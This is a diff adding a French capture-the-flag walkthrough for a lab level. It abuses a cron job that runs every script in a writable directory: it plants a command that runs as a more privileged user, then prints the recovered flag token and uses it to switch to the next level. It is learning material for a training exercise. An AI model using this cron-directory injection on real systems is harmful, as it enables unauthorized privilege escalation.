@@ -1,0 +1,27 @@
+LEVEL 05
+--------
+
+1.  Essayons de trouver le fichier à exploiter pour ce niveau.
+    Commande:   find /* 2>&1 | grep level05
+    Sortie:     /var/mail/level05
+    Le fichier level05 va nous intéresser.
+
+2.  Commande:   cat /var/mail/level05
+    Sortie:     */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+    Ceci est une tâche cron, qui va exécuter le script /usr/sbin/openarenaserver
+    toutes les 2 minutes.
+
+3.  Allons voir à quoi ressemble le script /usr/sbin/openarenaserver.
+    Commande:   cat /usr/sbin/openarenaserver
+    Le script execute tous les fichiers dans le dossier /opt/openarenaserver/
+
+4.  Nous allons alors faire une commande qui va créer un fichier qui contient
+    le flag du level05.
+    Commande:   echo "getflag > /tmp/flag" > /opt/openarenaserver/flag && sleep 140 && cat /tmp/flag
+    Sortie:     Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+    On introduit "getflag > /tmp/flag" dans /opt/openarenaserver/flag et attendre le temps que
+    la tâche cron s'exécute.
+
+4.  Commande: su level06
+    Mdp:      viuaaale9huek52boumoomioc
